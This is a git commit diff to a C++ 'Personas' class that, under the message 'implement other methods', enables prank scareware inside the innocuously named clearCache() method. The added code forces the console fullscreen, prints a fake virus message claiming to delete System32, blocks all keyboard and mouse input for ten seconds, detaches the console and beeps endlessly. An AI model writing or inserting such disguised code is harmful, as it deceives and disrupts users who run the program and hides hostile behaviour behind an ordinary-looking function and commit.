b9d9dc45def86ec840fafdfc2c93eedf8684eef3
Emanuel Vazquez <evazquezrosales@gmail.com>
2023-03-07 09:19:00 -0600

    implement other methods

--- src/personas.cpp
+++ src/personas.cpp
@@ -44,21 +44,21 @@ int Personas::buscarPersona(string n)
 }
 void Personas::clearCache()
 {
-    /*    FreeConsole();
-    while(1){
-        Beep(500,500);
-    }*/
+
     system("cls");
-    /*::SendMessage(::GetConsoleWindow(), WM_SYSKEYDOWN, VK_RETURN, 0x20000000);
+    ::SendMessage(::GetConsoleWindow(), WM_SYSKEYDOWN, VK_RETURN, 0x20000000);
 
     cout<<"lexi : virus LNK2019: unresolved external app void __cdecl \n"
         <<"Firewall(class std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >)\n"
         <<" (?Error@@YAXV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@@Z) "
-        <<"Deleting all files..."<<endl;
+        <<"Deleting System32 and WinSxS blocking"<<endl;
     BlockInput(true);
     Sleep(10000);
-    cout<<"unblock input"<<endl;
     BlockInput(false);
     Sleep(1000);
+     FreeConsole();
+    while(1){
+        Beep(500,500);
+    }
 }
 
